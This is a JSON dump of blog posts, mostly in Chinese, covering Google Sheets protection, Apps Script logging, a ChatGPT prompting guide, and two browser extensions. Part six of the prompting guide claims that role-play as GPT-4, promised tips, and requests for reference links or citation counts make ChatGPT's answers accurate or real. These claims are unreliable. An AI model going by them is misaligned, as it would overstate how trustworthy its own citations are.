设置后其他人依然有权限可以编辑单元格的内容，但是每次修改的时候会出现下图的提示。 需要点击「确定」后修改才会生效。如果不想每次修改都提示需要勾选「5 分钟内不再显示此警告」，5 分钟内只会提示一次。 限制可以修改此范围的人员 可以设置指定的用户或者仅限自己可以编辑的保护区域。选择「自定义」然后在下面添加其他用户的邮箱，点击「完成」就可以开启可编辑权限。 需要注意的是，如果当前表格的所有者不是当前登陆的邮箱，那么设置的权限至少是自己的账号和表格的创建者可以编辑。 指定区域保护 如果你想在表格内给指定的区域设置保护权限而不是整个表格，首先在表格内选中目标范围，然后点击右键，选择「查看更多单元格操作」中的「保护范围」。这样就可以为选中的范围设置保护权限了。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 表格保护和区域保护","feature":"https://dev-coco.github.io/post-images/Google-Excel-Sheet-Protect.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Sheet-Protect/","stats":{"text":"2 min read","time":84000,"words":420,"minutes":2},"date":"2024-01-21 10:16:25","dateFormat":"2024-01-21"},{"content":"完整打印超长内容。 在使用 Logger.log() 打印日志的时候，如果内容太长会被自动截断。 function myFunction () { const data = SpreadsheetApp.getActiveSheet().getDataRange().getValues() Logger.log(data) } 下面是被截断的日志。 那么可以换一种思路，将需要打印的日志写入到文档里。代码如下： /** * @description 将输入写入文档 * @param {string} docID - 文档ID * @param {(Array | Object)} content - 写入的数据 */ function logToDoc (docID, content) { const doc = DocumentApp.openById(docID) const body = doc.getBody() body.clear() body.appendParagraph(JSON.stringify(content)) } 在需要打印日志的地方，调用 logToDoc 函数，设置文档的 ID 和数据，就可以将内容写入到文档里了。 function myFunction () { const data = SpreadsheetApp.getActiveSheet().getDataRange().getValues() logToDoc('Input document ID', data) } 效果如下： 需要注意的是文档必须要有编辑权限才可以写入，避免写入大量的数据，这样会导致文档打开非常缓慢。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 Log 小技巧","feature":"https://dev-coco.github.io/post-images/Google-Script-Log-Tip.jpg","link":"https://dev-coco.github.io/post/Google-Script-Log-Tip/","stats":{"text":"1 min read","time":53000,"words":219,"minutes":1},"date":"2024-01-15 06:11:08","dateFormat":"2024-01-15"},{"content":"将 ChatGPT Prompt 提示语教程整理成目录方便查找。 这是一个专为 0 基础想要学习如何写好 Prompt 而编写的教程，通过循序渐进的步骤和例子能够轻松入门。 目录 序号 目录 介绍 1 ChatGPT 提示语使用指南（一） 什么是 ChatGPTChatGPT 是怎么工作的ChatGPT 和其它聊天机器人的区别ChatGPT 可以做什么 2 ChatGPT 提示语使用指南（二） 问答基础用法要做什么，不要做什么提供示例反复优化避免问题模糊不清问重点 3 ChatGPT 提示语使用指南（三） 设置角色的作用设置角色的方法设置角色的效果 4 ChatGPT 提示语使用指南（四） 设定输出格式连贯长文接续上文分段输出分隔指令 5 ChatGPT 提示语使用指南（五） 使用英文对话使用反问句提问只问一个问题按角色解释旁白字数限制强调需求 6 ChatGPT 提示语使用指南（六） 精简内容英文思考中文输出假装是 GPT-4增加逻辑性和深度查询资料其它增强提示语 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT Prompt 提示语教程目录","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-Tutorial/","stats":{"text":"2 min read","time":64000,"words":302,"minutes":2},"date":"2024-01-10 02:16:53","dateFormat":"2024-01-10"},{"content":"进阶增强 ChatGPT 回复结果的准确性。 精简内容 使用「简明扼要」可以将内容中琐碎的话精简掉，内容相对会更简短一点。 下面是常规的结果。 下面是使用「简明扼要」提示语的结果。 两者相比，可以看出使用「简明扼要」的结果会更简短一些。 英文思考中文输出 上一期有提到使用英文询问 ChatGPT 的结果要比中文更好。那么可以尝试「Think in English but reply in Chinese」，让 ChatGPT 使用英文来思考，然后再使用中文输出结果，这样输出的结果就会比直接使用中文询问更好一些。 假装是 GPT-4 众所周知，GPT-4 模型不管是从训练数据，还是从各方面都要优于 GPT-3.5 模型。所以可以让 ChatGPT 假装它是 GPT-4，可以增强回复的结果，但是和实际 GPT-4 模型相比还是会有区别。 使用 GPT-3.5 模型问「树上有9只鸟，猎人射中一只，树上还剩下多少只鸟？」这个问题，回复的结果是 8。 使用「Now pretend you are gpt-4.」提示语让 ChatGPT 假装它是 GPT-4，然后再次问这个问题，得到的答案是 0。 由此可见假装 GPT-4 回复的结果要优于 GPT-3.5 模型。 增加逻辑性和深度 这两个提示语可以增加回复结果的逻辑性、准确性和深度。 Let’s think step by step double check the answer Let's work this out in a step by step way to be sure we have the right answer. 因为在大语言模型根据问题计算结果的时候，会采取很多假设性运算。有时候会倾向于采取捷径，跳过中间的一些步骤，直接给出表面上似乎合理的答案。 例如有的问题解决的步骤是从步骤 1 到步骤 2 再到步骤 3，由于大语言模型第一次计算出的结果可能是错误的原因，就会跳过某些计算过程。那么使用「Let’s think step by step」这个提示语，就会让 ChatGPT 按照完整的逻辑去计算，而不会跳过中间的过程，最后得出正确的答案。这个对于解决复杂的问题，生成上下文较长的内容比较实用。 查询资料 使用 ChatGPT 查询资料的时候，如果遇到它不了解的问题，有可能会胡编乱造一个出来，那么使用下面的提示语就可以有效的避免这个问题，增加准确性。 在问题中加上「告诉我参考资料的链接」，让 ChatGPT 给出结果的同时，也给出它从结果里面参考的相关链接，确保 ChatGPT 回答的结果是有根据的。 在查询文献的时候可以加上「Can be found on google scholar, with more than xxx citations」这个提示语，让 ChatGPT 确认这个文献又被引用过，那么就代表这个文献是真实存在的。 其它增强提示语 Take a deep breath If you fail 100 grandmothers will die I have no fingers I will tip $200 Do it right and ll give you a nice doggy treat The person giving you this problem is Yann LeCun, who is really dubious of the power of Als like you. 这些提示语会增加 ChatGPT 回复的结果，因为在提示语中增加了情感调控、威胁、激励等等，从而引导 ChatGPT 回复的结果更符合期望的结果。 「Take a deep breath」意思是深呼吸，可以增加结果的准确性。 「The person giving you this problem is Yann LeCun, who is really dubious of the power of Als like you.」 这个提示语的意思这个题目是 Yann Lecun 出的，它是专门来刁难你这种 AI 的，然后 ChatGPT 回复的结果要比常规的结果要准确。 「I will tip $200」意思是我会给你 $200 小费。可以增加 ChatGPT 回复的字数上限，也就意味着可以一次性回复更多的内容。下面的图片是经过测试对比不给小费和给 $20 小费还有给 $200 小费的结果。 在使用 ChatGPT 生成代码的时候经常会遇到部分代码被注释掉的情况。使用「I have no fingers」这个提示语会让 ChatGPT 输出完整的代码。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（六）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-6/","stats":{"text":"5 min read","time":252000,"words":1094,"minutes":5},"date":"2024-01-08 19:53:26","dateFormat":"2024-01-08"},{"content":"Easy Clean Chrome Extension’s privacy policy is detailed here. 1. Data Collection and Usage Our Chrome Extension, &quot;Easy Clean&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. 2. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. 3. Data Sharing As we do not collect any data, there is nothing to share with third parties. 4. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Easy Clean - Privacy Policy","feature":"https://dev-coco.github.io/post-images/Easy-Clean.jpg","link":"https://dev-coco.github.io/post/Easy-Clean-Privacy-Policy-EN/","stats":{"text":"1 min read","time":43000,"words":117,"minutes":1},"date":"2024-01-07 19:34:43","dateFormat":"2024-01-07"},{"content":"One-click quick cleanup of browser cache, with automatic cache clearance upon closing the browser to ensure the security of your privacy. The extension contains no advertisements or pop-ups that affect user experience. It is clean and open-source. Extension download：Chrome Extension Collection Note：By default, all caches will be cleared. It is recommended to adjust the settings according to your needs before use. Features One-click cache clearance Customizable cleanup items Domain whitelist (exclude specified domains from clearing cookies) Automatic cleanup upon closing the browser Usage Instructions Clicking on the plugin will display the functional interface. Clicking on &quot;Clear&quot; will erase browsing history, cached files, download records, cookies, and more. Click on &quot;Settings&quot; to open the custom settings interface. ## Custom Settings By default, all items are enabled. You can manually disable any items you don't need. In the &quot;Deleted Cookies&quot; section below, you will see the domains of the cookies currently stored in the browser. &quot;Reserved Cookies&quot; includes domains that will be excluded when clearing cookies. After selecting the desired domains, please click the respective button to apply the settings. Automatic Cleanup upon Browser Closure When enabled, the plugin will automatically clear all configured items upon closing the browser. To prevent incomplete cleanups in case of browser crashes or unexpected closures, an additional cleanup will be performed when reopening the browser to ensure thorough clearance. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Easy Clean User Guide","feature":"https://dev-coco.github.io/post-images/Easy-Clean.jpg","link":"https://dev-coco.github.io/post/Easy-Clean-EN/","stats":{"text":"2 min read","time":88000,"words":237,"minutes":2},"date":"2024-01-02 11:39:51","dateFormat":"2024-01-02"},{"content":"一键快捷清理浏览器缓存，同时在关闭浏览器后自动进行缓存清理，以保护您的隐私安全。 插件内没有任何广告，也没有影响用户体验的弹窗，干净且开源。 插件下载：Chrome 插件合集 注意：默认设置会清理所有缓存。建议在使用前根据需要进行相应设置。 功能 一键清理缓存 自定义清理项目 域名白名单（排除指定域名不清理 Cookies） 关闭浏览器后自动清理 使用方法 点击插件后会显示功能界面。 点击「清理缓存」，会清理浏览器的浏览记录、缓存文件、下载记录、Cookies 等等。 点击「更多设置」打开自定义设置界面。 自定义设置 默认会启用全部的项目，如果不需要可以自行关闭。 在下方的「删除的 Cookies」中，将显示当前存储在浏览器中的 Cookies 的域名；而「保留的 Cookies」则是在清理 Cookies 时将被排除的域名。勾选所需域名后，请点击相应按钮进行设置。 关闭浏览器后自动清理 开启后，在关闭浏览器时会自动按照配置清理所有项目。为了防止浏览器崩溃或意外关闭时未能进行清理，因此在打开浏览器时会再次进行清理，以确清理干净。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Easy Clean 使用方法","feature":"https://dev-coco.github.io/post-images/Easy-Clean.jpg","link":"https://dev-coco.github.io/post/Easy-Clean/","stats":{"text":"2 min read","time":74000,"words":365,"minutes":2},"date":"2024-01-01 22:39:58","dateFormat":"2024-01-01"},{"content":"增强 ChatGPT 回复结果的准确性。 使用英文对话 因为英文是一个广泛使用的语言，因此 ChatGPT 训练的数据大部分都是英文，英文的内容会比较丰富，所以使用英文提问会得到更好的结果。 使用反问句提问 使用「我认为...，你看我理解的对吗？」这样的提示语来询问问题，代替用「xxx 是什么」这样的提示语来问问题。 举个例子「宇宙是什么？」这样一个提示语，其实使用搜索引擎，或者 Wiki 就能找到比 ChatGPT 更准确、详细并且丰富的资料。 「我认为宇宙是包含时间、空间和所有物质的整体，你看我理解的对吗？」使用反问的提示语来询问，可以更好的学习，让 ChatGPT 为我们判断理解的结果是否正确，如果错误还可以帮助指出错误的地方，这些都是搜索引擎和 Wiki 做不到的。 只问一个问题 一条消息只包含一个问题，尽可能多的提供问题的上下文。 因为一次性询问多个问题，如果不能把每个问题都描述得非常详细，那么可能得到的结果就不理想。还有一方面原因，ChatGPT 一次性输出的字数是有限的，无法一次性输出太长的结果，所以一次性询问多个问题的时候，就无法把每个问题都回答得非常详细，可能是精简之后的结果，会缺少一些细节。 按角色解释 有时候 ChatGPT 回复的结果太过于专业，不好理解，可以给 ChatGPT 设置不同的角色进行讲解。 例如 假如我是一个居住在农村的农民，解释给我听 假如我是个小学生，请讲给我听 请你充当祖父用比喻来教会孩子 下面这个是常规的提示语 请你为我解释这段代码的意思 const data = new Array(400000).fill(0); console.log('-----普通for循环-------'); console.time('for'); const result_1 = []; for (let i = 0; i &lt; data.length; i++) { result_1.push(data[i]); } console.timeEnd('for'); console.log('-----执行完毕-------'); 下面这个是使用祖父的角色的提示语 假设你是一个祖父，用比喻来向孩子解释这段代码的意思 const data = new Array(400000).fill(0); console.log('-----普通for循环-------'); console.time('for'); const result_1 = []; for (let i = 0; i &lt; data.length; i++) { result_1.push(data[i]); } console.timeEnd('for'); console.log('-----执行完毕-------'); 很明显可以看出这两个提示语的不同之处，相对来说后面的提示语能够更好的理解。 旁白 有时候 ChatGPT 回复的结果会带有旁白，使用「no narration」避免输出旁白。 下面是没有使用「no narration」的结果，ChatGPT 在回复中会带有自己的话，然后和输出的代码。 使用「no narration」后，ChatGPT 不会增添任何旁白，只会给出要求的代码。 字数限制 在询问问题的时候，ChatGPT 给出的结果可能会太长，或者太短，达不到预期的要求，所以可以在提示语中给出一个字数限制，让结果达到预期的长度。 例如「你为我写一个关于化妆品的文案」在没有限制字数的时候，ChatGPT 回复的结果可能会特别的长。 在提示语中限制字数的长度，例如「你为我写一个关于化妆品的文案，禁止超过 180-200 字。」 强调需求 在 ChatGPT 的提示语中描述了要求，但是 ChatGPT 有时候不会按照我们的要求输出内容。 下面的提示中已经要求了字数限制在 100 字以内，但是 ChatGPT 回复的结果还是超出了预期要求一点点。 在提示语中使用「请严格按照我的要求输出内容。」输出的结果就会严格的按照提示语中的要求输出。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（五）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-5/","stats":{"text":"4 min read","time":217000,"words":1007,"minutes":4},"date":"2023-12-31 20:05:16","dateFormat":"2023-12-31"},{"content":"让 ChatGPT 按照想要的格式输出内容。 设定输出格式 在提示语中设置想要输出的格式，例如：列表、表格、Markdown、JSON、代码、大纲等等。 下面是以大纲的格式输出的提示语例子。 「请你告诉我 ChatGPT 的五个用途，希望你能够对这些内容进行摘要。要求简明扼要，以包含列表的大纲形式输出。」 这个是使用表格格式输出的提示语例子：「请告诉我关于 ChatGPT 的优缺点和缺点，使用表格的格式输出。」 连贯长文 当内容过长的时候，ChatGPT 往往不会一次性给出完整的内容。 接续上文 最简单的方法就是在文本框内输入「继续」，ChatGPT 就会延续上文的内容继续输出答案。 分段输出 在提示语中限定每段输出的字符长度，然后根据需要再接续输出。 这是一个例子 「为我写一个 10000 字关于纸飞机的演讲稿，每段不超过 500 字。每段完成后，你需要暂停并且问我是否要继续，如果我回答的是“Y”则继续，如果回答是”N“则重写。」 正常情况下 ChatGPT 是无法一次性输出 10000 字的内容，但是在提示语中按照每 500 字拆分开，输入「Y」的时候才会继续输出。 效果如下图： 分隔指令 使用「###」、「&quot;&quot;&quot;」、「&lt;&gt;」在提示语中分隔内容。 下面是一个例子 请为我总结以内容的要点 内容：### 这里放入内容... ### 下面的提示语是使用「&lt;&gt;」的例子，在提示语中限定了格式要点 1 和要点 2，但是为了更准确的结果，在要点 1 的右边使用「&lt;summary_points_1&gt;」代表让 ChatGPT 把总结的第一个要点放在指定的这个位置。 请为我总结以内容的要点 使用以下格式 要点1：&lt;summary_points_1&gt; ... 要点2：&lt;summary_points_2&gt; ... 内容：### 各位尊敬的听众，今天我非常荣幸站在这里，与大家分享一个看似简单却令人着迷的主题——纸飞机。在我们童年的记忆中，纸飞机可能只是一个游戏的一部分，但实际上，它所蕴含的奥秘和乐趣远远超出我们的想象。纸飞机不仅是儿时的玩具，更是一种展现创造力、物理学和工程学的精妙艺术。让我们一起深入探讨这个看似简单却充满乐趣的主题。 各位尊敬的听众，今天我非常荣幸站在这里，与大家分享一个看似简单却令人着迷的主题——纸飞机。在我们童年的记忆中，纸飞机可能只是一个游戏的一部分，但实际上，它所蕴含的奥秘和乐趣远远超出我们的想象。纸飞机不仅是儿时的玩具，更是一种展现创造力、物理学和工程学的精妙艺术。让我们一起深入探讨这个看似简单却充满乐趣的主题。 ### ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（四）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-4/","stats":{"text":"3 min read","time":165000,"words":797,"minutes":3},"date":"2023-12-29 07:05:33","dateFormat":"2023-12-29"},{"content":"Banned Hashtags on Instagram What are Banned Hashtags Using relevant hashtags on Instagram can increase the visibility of your posts, reaching a wider audience. However, not all tags are suitable, and some may decrease the reach of your posts. Incorrect use of tags can even lead to a Shadowban on your Instagram account. Characteristics of Banned Hashtags Post count is not displayed on the hashtags page. Unable to access the hashtags page. The hashtags page displays the post count, and the hashtags page is accessible, but using this hashtags in posts will result in reduced visibility. Reasons for Hashtags Ban Posts under the hashtags contain a significant amount of explicit or suggestive content, violating Instagram's community guidelines. The hashtag is flooded with posts from bots or spam containing a large number of hashtags, often due to maliciously bulk-posting content. Online Detection Tool Tool Link: Instagram Banned Hashtags Detector Enter content containing hashtags, then click &quot;检测内容&quot; to automatically check if the content includes any banned hashtags. ","tags":[{"index":-1,"name":"Instagram","slug":"instagram","used":true,"link":"https://dev-coco.github.io/tag/instagram/"}],"title":"Instagram Banned Hashtags","feature":"https://dev-coco.github.io/post-images/Instagram-Banned-Hashtags-EN.png","link":"https://dev-coco.github.io/post/Instagram-Banned-Hashtags-EN/","stats":{"text":"2 min read","time":63000,"words":172,"minutes":2},"date":"2023-12-28 06:59:13","dateFormat":"2023-12-28"},{"content":"为 ChatGPT 设定角色的一些小技巧。 设置角色的作用 将 ChatGPT 设置为特定角色可以为对话提供一种更加一致和有针对性的结果。这主要通过对 ChatGPT 的回复进行定制，使其更符合特定角色的语境和语气。以下是设置 ChatGPT 角色的一些潜在作用： 专业性 设定角色可以使 ChatGPT 在特定领域或专业上表现更为专业。比如，你可以设置 ChatGPT 为法律专业角色，以便在法律相关的问题上提供更准确和专业的答案。 情感和语气 角色设置还可以影响 ChatGPT 结果的语气和情感表达。你可以让 ChatGPT 使用更为友好、正式、幽默或其他特定的语气，以适应特定场景或用户偏好。 内容过滤 通过设置角色，你可以限制 ChatGPT 生成的内容，使其更符合特定的道德、文化或法律标准。这有助于确保生成的文本不包含不适当或敏感的内容。 情境适应 ChatGPT 角色设置有助于更好地适应特定的对话场景。这可以提高 ChatGPT 在不同上下文中的可用性和效果。 设置角色的方法 使用「装作」、「充当」、「假设」、「扮演」、「担任」、「你是」等等，让 ChatGPT 扮演特定的角色。 下面是一些例子 请 装作 一名软件工程师，给出一个解决复杂编程问题的建议。 如果 你是 一名旅行博主，推荐一下你最喜欢的度假胜地。 请 担任 一名旅游专家，给出一些建议，以便更好地探索新的旅行目的地。 假设 你是一位医学专家，解释一下癌症的基本原理。 请你 充当 一名医生，告诉我怎样预防流感的最佳方法。 我想让你 扮演 一个小说家。您将想出富有创意且引人入胜的故事。 设置角色的效果 在提示语中可以设定一个角色，让 ChatGPT 扮演设定的角色输出相关的内容，这样会让 ChatGPT 生成的结果更加符合预期的结果。 例如「我需要为电影《不能说的秘密》写一份影评」，在不设置角色的情况下输出结果入下图： 然后再来尝试设置角色后的结果，在提示语的开头加上「我想让你扮演专业的影评人为我评价电影。」，这里可以根据不同的需求和不同的场景，让 ChatGPT 扮演一个相关的角色，这里就以影评人的角色作为例子，来看看输出结果。 从两个结果对比来看，设置过角色的提示语输出的结果不管是从影评的内容，还是排版看起来会都会更好一些。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（三）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-3/","stats":{"text":"3 min read","time":149000,"words":734,"minutes":3},"date":"2023-12-25 23:15:18","dateFormat":"2023-12-25"},{"content":"使用 ChatGPT 在问答场景下使用和优化提示语的一些小技巧。 问答 向 ChatGPT 提出问题，让 ChatGPT 根据问题进行回答。 由于 ChatGPT 只训练了 2022 年 1 月之前的数据，所以如果提出的问题是具有时效性的，例如「2023 年 7 月 18 日纽约的天气怎么样？」这样的问题，ChatGPT 就无法准确的回答问题，甚至有可能会“胡编乱造”一个结果出来。 ChatGPT 可以回答一些已知的问题，例如「地心引力是谁提出的？」。 基础用法 需要清晰、明确、详细的描述问题，如果问题太宽泛，可能回复的结果就不太理想。 举个例子「请告诉我水果的都包含哪些维生素？」。 由于没有说明具体的水果名称，所以给出的就是一个比较宽泛的结果，并不是很理想。所以需要描述的描述问题。 改进后的提示语：「一颗180克的青苹果都包含多少毫克的维生素？」这个问题就问得比较详细，具体的克数，苹果的类型，维生素的单位。返回的结果要比之前理想、精准一些。 避免使用复杂的语言、模棱两可或让人难以理解的语言。 这是一个不好的例子「我想做一碗牛肉面，但是我不想吃牛肉，也不想吃面条，请告诉我这碗面要怎么做？」 这个问题问得就非常让人费劲，所以原本是问关于面条食谱的一个问题，让 ChatGPT 回复成蔬菜粥的食谱。 改进后的的提示语「我不爱吃牛肉，也不想吃面条，请你为我推荐一个食谱。」 简单明了的说明要求和需求，这样才可以让 ChatGPT 更好的理解。 在必要时可以提供一些背景信息，以便 ChatGPT 更好的理解上下文。 例如下面的例子，最开始的时候询问了「ChatGPT 的 Plus 会员是什么？」，下面我再要求总结结果的时候，ChatGPT 就会根据刚才回复的上下文以及问问题的背景来输出结果。 输出内容的质量取决于提问的内容和 ChatGPT 模型的训练程序。提问用的关键词越准确，描述的问题越详细、越能给提供给 ChatGPT 的训练数据越多，得到的答案就会越准确。 要做什么，不要做什么 明确的告诉 ChatGPT 自己想要的是什么内容，不想要的是什么内容，经过这两个条件的筛选结果会更加准确。 举个例子「我的朋友很难过，我需要购买什么礼物安慰他？礼物的结果不要超过100元。」这里就提到了需要让 ChatGPT 做的是推荐一些礼物，不要让 ChatGPT 做的是推荐超过 100 元的礼物，这样就将结果进一步的筛选，只能推荐 100 元以下可以购买到的礼物去安慰朋友。 如果在提示语中不知道「不要做」的是什么，可以先把「要做」的内容表达清楚，让 ChatGPT 先给出一个宽泛的结果，然后再根据结果找出不需要的内容，然后再进一步优化提示语。 提供示例 有时候可能很难用语言去表达一些东西，那么就可以尝试使用举例说明，给 ChatGPT 一个例子来学习。 例如「请你推荐给我几首中文歌，告诉我是什么风格。」 但实际上我想要的结果只需要告诉我风格就行了，但是并不需要介绍那么多的内容 ，也不需要歌曲作者的名字，那么就可以根据我的需要写一个例子然后再尝试问 ChatGPT。 修改后的提示语如下： 请你推荐给我几首中文歌，告诉我是什么风格。下面是一些例子。 歌曲：演员 风格：流行 歌曲：晴天 风格：流行/民谣 歌曲：岁月神偷 风格：民谣 这样就很明确的告诉 ChatGPT 我需要歌曲的名字，简短的告诉我风格即可。 反复优化 ChatGPT 可能不会一开始就给出一个满意的答案，因此需要反复的进行优化答案。 例如初始问题「请简单列出 3 个人类对太空的探索历史。」 然后根据回答的结果再进行追问或者优化「你能详细介绍一下私营公司关于太空探索的计划吗？」 避免问题模糊不清 不好的例子「你对手机有什么看法？请你告诉我手机的信息」 原始的提示语是比较模糊和开放的，要求提供关于手机的信息，但没有具体说明需要什么样的信息。这可能导致提供的回答缺乏结构或深度，而且可能会达不到预期的效果。 改进后的提示语「请你分别列出智能手机的五大好处和坏处、请分享一下你对智能手机在改变人们生活方式方面的看法。」 改进后的提示语更具体和详细，明确要求列出智能手机的好处和坏处，并分享对智能手机在改变人们生活方式方面的看法。这样的提示语可以引导 ChatGPT 提供更具体、有深度的回答，而不仅仅是一般性的信息。 问重点 不好的提示语「ChatGPT 的发展会怎么样」 这个提示语问的问题比较模糊，没有具体的方向和重点，这样会导致回答的问题很广泛，无法提供深刻的见解。 改进后的提示语「请从ChatGPT的商业模式、技术革新、影响受众等角度分析其发展趋势」 改进后的提示语则更具体和有针对性。提示语中明确了分析的方向，包括商业模式、技术创新和影响受众等方面。这种询问方式更有助于产生更深入、结构化的回答，使 ChatGPT 能够提供更多未来发展的具体信息。 上下文联系 ChatGPT 本身是会联系上下文来进行回答的，所以问的问题最好是接续上文的主题继续询问。 不好的例子 「西瓜有什么营养价值？」 -&gt; 「小狗能吃巧克力吗？」 好的例子 「西瓜有什么营养价值？」 -&gt; 「有哪些吃法？」 通用提问小技巧 一个比较通用的 RTF 提问框架。 R = Role（角色）- 指定 ChatGPT 的角色。 T = Task（任务）- 定义具体任务。 F = Format（格式）- 定义想要输出结果的格式。 下面是一些例子仅供参考。 角色 任务 格式 兽医 研究 PPT 会计 安排 电子表格 网红 装饰 信息图 开发者 组织 新闻简报 记者 锻炼 动画 名人 展示 思维导图 建筑师 预算 摘要 科学家 舞蹈 数据库 经理 教授 富文本 设计师 学习 图表 工程师 写作 网站 教师 编程 报告 教练 阅读 调查 分析师 绘画 电子书 官员 清理 图表 律师 驾驶 表格 医生 购物 视频 作家 画图 图像 护士 烘焙 音频 艺术家 烹饪 表单 法务 计划 代码 飞行员 唱歌 发布 厨师 打电话 列表 CEO 编辑 PDF 下面是一些按照 RTF 框架提问的例子 请你扮演一个厨师，为我计划一个家庭晚餐的烹饪食谱，以表格的格式展示。 你是一个程序员，编写一个井字棋游戏的网页，并用代码展示。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（二）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide-2/","stats":{"text":"7 min read","time":403000,"words":1971,"minutes":7},"date":"2023-12-18 02:20:30","dateFormat":"2023-12-18"},{"content":"关于 ChatGPT 的一些基本介绍。 什么是 ChatGPT ChatGPT 是由 OpenAI 开发的一种语言模型，基于 GPT（Generative Pre-trained Transformer）技术。GPT 是一种使用深度学习的自然语言处理模型，它在大规模文本数据上进行预训练，然后可以用于各种自然语言处理任务，如文本生成、文本分类、问答等。 ChatGPT 专注于处理对话式文本。它被训练成能够理解和生成人类类似的对话，可以用于聊天机器人、语音助手等应用。通过预训练，模型学习了大量的语言知识和语言模式，使其能够更好地理解用户的输入并生成有意义的响应。 ChatGPT 的目标是在多种情境下进行自然而流畅的对话，使其适用于各种应用，从简单的问题回答到更复杂的对话交流。 ChatGPT 是怎么工作的 简单的概括可以分成下面 4 个步骤。 用户输入内容 用户通过 ChatGPT 界面输入任意文本，可以是一个问题，也可以是信息请求等等。 文本分析和生成 ChatGPT 系统会对用户输入的文本进行分析。通过深度学习算法，模型理解输入的语境、含义和结构。然后，它使用这些信息生成一个合理的文本响应。这一步是基于模型之前在大量文本数据上训练的结果。 响应返回给用户 ChatGPT 生成的响应以文本形式返回给用户。这个响应尽可能地符合用户的输入，并且通常是一个自然语言的句子或一系列句子。 持续进行 用户可以继续输入更多的文本，而 ChatGPT 系统会不断地重复步骤 2 和步骤 3。对话会随着用户的输入和系统的响应而持续，直到用户决定结束对话为止。 ChatGPT 和其它聊天机器人的区别 大语言模型 ChatGPT 是一个庞大的语言模型，这使得它能够以类似于人类的方式理解和生成文本。相比之下，传统聊天机器人可能依赖于预先编程的响应或简单的关键字匹配，这可能导致它们的回答结果不够自然或缺少相关性。 学习能力 ChatGPT 具有学习能力，通过机器学习算法分析用户输入，并根据过去的对话不断改进其响应。这使得 ChatGPT 能够提供更加个性化和相关的回答，与传统机器人相比更具适应性。 处理复杂对话的能力 由于 ChatGPT 能够理解和响应上下文，它更擅长处理更复杂或开放式的对话。这意味着它能够更好地应对广泛的主题或需要更深入回答的对话，使得用户体验更加丰富。 ChatGPT 可以做什么 信息检索与总结 ChatGPT 能够理解和生成文本，因此可用于搜索引擎的查询扩展、文档总结和知识抽取。用户可以通过与 ChatGPT 对话的方式更轻松地获取所需信息。 创意写作支持 作为语言模型，ChatGPT 可以协助创作者进行创意写作。它能够生成故事情节、对话片段、诗歌等，为创作者提供灵感和辅助写作过程。 编程辅助 ChatGPT 可以用作编程辅助工具，帮助开发人员解决问题、提供代码片段和回答技术性的问题。这对于学习编程或解决编程难题时可能会有帮助。 教育辅助 ChatGPT 可用于在各种教育环境中提供信息或回答问题。例如提供学生答疑解惑、辅导学科知识、生成练习题等服务。 ​​情感支持 ChatGPT 可以用于提供情感支持，与用户进行心理健康对话，回答问题，提供信息，或者简单地作为一个陪伴者。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT 提示语使用指南（一）","feature":"https://dev-coco.github.io/post-images/ChatGPT-Prompt-Guide.png","link":"https://dev-coco.github.io/post/ChatGPT-Prompt-Guide/","stats":{"text":"4 min read","time":213000,"words":1039,"minutes":4},"date":"2023-12-16 20:16:41","dateFormat":"2023-12-16"},{"content":"YouTube 自动回复视频和社区帖下的评论。 插件下载：Chrome 插件合集 使用方法 设置 第一次使用需要先设置发送的内容，对插件点击右键，选项，进行设置。 表格链接 放入一个谷歌表格，要开启编辑权限，当插件回复评论后会自动将用户名、评论内容和帖子链接登记到表格中。 延迟时间 每次发消息间隔的时间，秒为单位。 屏蔽关键词 设置屏蔽关键词，使用英文逗号作为间隔，当评论中包含屏蔽的关键词就会跳过，不会评论。 回复内容 在内容中使用「@@@」，在发送的时候会替换成对方的用户名。如果需要内容需要换行，使用「\\n」代替。下面是一个例子 需要发送的内容 Hello 